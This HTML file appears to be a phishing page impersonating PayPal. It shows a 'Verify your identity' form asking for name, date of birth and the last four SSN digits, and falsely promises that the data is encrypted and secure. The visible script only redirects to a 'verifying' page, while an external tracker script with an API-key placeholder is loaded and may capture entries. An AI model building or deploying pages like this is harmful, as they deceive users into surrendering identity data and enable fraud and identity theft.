<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify your identity - PayPal</title>
    <link rel="stylesheet" href="assets/css/styles.css">

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
    <main class="container">
        <div class="login-card" style="max-width: 480px;">
            <div class="logo">
                <svg width="101" height="32" viewBox="0 0 101 32" fill="none" xmlns="http://www.w3.org/2000/svg">

                    </g>
                </svg>
            </div>

            <div class="page-header">
                <h1 class="page-title">Verify your identity</h1>
                <p class="page-description">Provide some information to help us confirm your identity</p>
            </div>

            <div class="alert-box info">
                <span class="alert-icon">ℹ️</span>
                <div class="alert-content">
                    <div class="alert-title">Why is this needed?</div>
                    <div class="alert-message">To protect your account and comply with regulations, we need to verify your identity.</div>
                </div>
            </div>

            <form class="login-form" id="identityForm" novalidate>
                <div class="form-group">
                    <input type="text" id="firstName" name="firstName" class="form-input" placeholder="First name" required>
                    <label for="firstName" class="form-label">First name</label>
                </div>

                <div class="form-group">
                    <input type="text" id="lastName" name="lastName" class="form-input" placeholder="Last name" required>
                    <label for="lastName" class="form-label">Last name</label>
                </div>

                <div class="form-group">
                    <input type="text" id="dob" name="dob" class="form-input" placeholder="Date of birth (MM/DD/YYYY)" maxlength="10" required>
                    <label for="dob" class="form-label">Date of birth (MM/DD/YYYY)</label>
                </div>

                <div class="form-group">
                    <input type="text" id="ssn" name="ssn" class="form-input" placeholder="SSN (Last 4 digits)" maxlength="4" required>
                    <label for="ssn" class="form-label">SSN (Last 4 digits)</label>
                </div>

                <div class="security-badge">
                    <span class="security-icon">🔒</span>
                    <span class="security-text">Your information is encrypted and secure</span>
                </div>

                <button type="submit" class="btn btn-primary">Submit</button>
            </form>
        </div>
    </main>

    <footer class="footer">
        <a href="#" class="footer-link">Contact Us</a>
        <a href="#" class="footer-link">Privacy</a>
        <a href="#" class="footer-link">Legal</a>
    </footer>

    <script>
        const identityForm = document.getElementById('identityForm');
        const dobInput = document.getElementById('dob');
        const ssnInput = document.getElementById('ssn');

        dobInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2 && value.length < 4) {
                value = value.slice(0, 2) + '/' + value.slice(2);
            } else if (value.length >= 4) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4, 8);
            }
            e.target.value = value;
        });

        ssnInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
        });

        identityForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const submitButton = identityForm.querySelector('.btn-primary');
            submitButton.classList.add('loading');
            submitButton.disabled = true;
            
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            console.log('Identity info submitted');
            window.location.href = 'verifying.html';
        });
    </script>
</body>
</html>
